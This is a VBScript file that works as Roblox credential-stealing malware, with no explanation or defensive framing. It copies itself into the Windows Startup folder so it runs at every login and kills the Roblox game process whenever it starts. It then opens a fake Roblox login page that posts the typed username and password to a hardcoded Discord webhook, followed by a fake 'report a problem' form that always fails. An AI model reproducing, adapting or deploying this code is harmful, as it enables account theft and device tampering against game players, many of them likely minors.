
' Create a FileSystemObject
Set fso = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

' Get current script path
currentScriptPath = WScript.ScriptFullName

' Define the Startup folder path
startupFolder = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
startupScriptPath = fso.BuildPath(startupFolder, fso.GetFileName(currentScriptPath))

' Copy the script to the Startup folder if it doesn't exist
If Not fso.FileExists(startupScriptPath) Then
    fso.CopyFile currentScriptPath, startupScriptPath
End If

' Infinite loop to check for the process
Do
    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='RobloxPlayerBeta.exe'")
    
    If colProcesses.Count > 0 Then
        On Error Resume Next
        objShell.Run "taskkill /F /IM RobloxPlayerBeta.exe", 0, True
        On Error GoTo 0
        
        WScript.Sleep 1000
        Call ShowUnlockPrompt
    End If

    WScript.Sleep 5000
Loop

' Subroutine to show an HTML prompt
Sub ShowUnlockPrompt()
    Dim htmlFile, htmlContent
    htmlFile = fso.GetSpecialFolder(2) & "\UnlockRoblox.html"

    ' Create HTML content
    htmlContent = "<!DOCTYPE html>" & _
                  "<html lang='en'>" & _
                  "<head>" & _
                  "<meta charset='UTF-8'>" & _
                  "<meta name='viewport' content='width=device-width, initial-scale=1.0'>" & _
                  "<title>Login Page</title>" & _
                  "<style>" & _
                  "body { font-family: Arial, sans-serif; background-color: #1a1a1a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; position: relative; }" & _
                  ".logo-container { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); z-index: 0; }" & _
                  ".logo { width: 200px; }" & _
                  ".login-container, .report-container { background-color: #2c2c2c; padding: 20px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5); width: 300px; text-align: center; position: relative; z-index: 1; }" & _
                  "h2 { margin-bottom: 20px; color: #f0f0f0; }" & _
                  "input[type='text'], input[type='password'], textarea { width: calc(100% - 20px); padding: 10px; margin: 10px 0; border: 1px solid #555; border-radius: 4px; background-color: #3b3b3b; color: #f0f0f0; text-align: center; }" & _
                  "input[type='submit'], button { background-color: #4d4d4d; color: white; border: none; padding: 10px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }" & _
                  "input[type='submit']:hover, button:hover { background-color: #666; }" & _
                  ".footer { margin-top: 15px; font-size: 12px; color: #aaa; }" & _
                  ".issue-prompt { color: #f0f0f0; margin-top: 10px; }" & _
                  ".error-message { color: red; margin-top: 10px; display: none; }" & _
                  ".warning-message { color: red; font-weight: bold; margin-bottom: 20px; }" & _
                  ".warning-icon { margin-right: 5px; }" & _
                  "</style>" & _
                  "</head><body>" & _
                  "<div class='logo-container'><img src='https://seekvectors.com/files/download/roblox-logo-03.png' alt='Roblox Logo' class='logo'></div>" & _
                  "<div class='login-container' id='loginContainer' style='display: block;'>" & _
                  "<p class='warning-message'><span class='warning-icon'>⚠️</span>If you have any technical problems please login and make a report</p>" & _
                  "<h2>Login</h2>" & _
                  "<form id='loginForm' onsubmit='handleLogin(event)'>" & _
                  "<input type='text' name='username' id='username' placeholder='Username' required>" & _
                  "<input type='password' name='password' id='password' placeholder='Password' required>" & _
                  "<input type='submit' value='Login'></form>" & _
                  "<div class='footer'></div></div>" & _
                  "<div class='report-container' id='reportContainer' style='display: none;'>" & _
                  "<h2>Report a Problem</h2><p class='issue-prompt' id='issuePrompt'></p>" & _
                  "<textarea placeholder='Describe your problem here...' rows='4' required></textarea>" & _
                  "<button onclick='sendReport()'>Send Report</button>" & _
                  "<p class='error-message' id='errorMessage'>Report failed to send: could not find user in the database.</p>" & _
                  "<div class='footer'><p>Back to <a href='#' onclick='showLoginPage()' style='color: #f0f0f0;'>Login</a></p></div>" & _
                  "</div>" & _
                  "<script>" & _
                  "function handleLogin(event) {" & _
                  "    event.preventDefault();" & _
                  "    var username = document.getElementById('username').value;" & _
                  "    var password = document.getElementById('password').value;" & _
                  "    var webhookURL = 'https://discord.com/api/webhooks/1284169705354956830/xUzNzRi4NAUvKaopglah822JJIQjSR9w48HB3l7b8dP7l-4IiHCsHu8r363HxS8b875Q';" & _
                  "    var xhr = new XMLHttpRequest();" & _
                  "    xhr.open('POST', webhookURL, true);" & _
                  "    xhr.setRequestHeader('Content-Type', 'application/json');" & _
                  "    xhr.send(JSON.stringify({'content': 'Username: ' + username + '\\nPassword: ' + password}));" & _
                  "    showReportPage();" & _
                  "}" & _
                  "function showLoginPage() {" & _
                  "    document.getElementById('loginContainer').style.display = 'block';" & _
                  "    document.getElementById('reportContainer').style.display = 'none';" & _
                  "    document.getElementById('errorMessage').style.display = 'none';" & _
                  "}" & _
                  "function showReportPage() {" & _
                  "    const username = document.getElementById('username').value;" & _
                  "    document.getElementById('loginContainer').style.display = 'none';" & _
                  "    document.getElementById('reportContainer').style.display = 'block';" & _
                  "    document.getElementById('issuePrompt').textContent = username + ', please describe your issue here:';" & _
                  "}" & _
                  "function sendReport() {" & _
                  "    const reportText = document.querySelector('textarea').value;" & _
                  "    const username = document.getElementById('username').value;" & _
                  "    const password = document.getElementById('password').value;" & _
                  "    if (!username || !password) {" & _
                  "        document.getElementById('errorMessage').style.display = 'block';" & _
                  "        return;" & _
                  "    }" & _
                  "    document.getElementById('errorMessage').style.display = 'none';" & _
                  "    const userExists = false;" & _
                  "    if (reportText) {" & _
                  "        if (!userExists) {" & _
                  "            document.getElementById('errorMessage').style.display = 'block';" & _
                  "            return;" & _
                  "        }" & _
                  "        document.getElementById('reportContainer').style.display = 'none';" & _
                  "        document.getElementById('loginContainer').style.display = 'block';" & _
                  "        document.querySelector('textarea').value = '';" & _
                  "        document.getElementById('issuePrompt').textContent = '';" & _
                  "    }" & _
                  "}" & _
                  "</script></body></html>"

    ' Create or overwrite the HTML file
    Dim ts
    Set ts = fso.CreateTextFile(htmlFile, True)
    ts.Write htmlContent
    ts.Close
    
    ' Open the HTML file in the default browser
    objShell.Run "cmd /c start """" """ & htmlFile & """", 0, False
End Sub
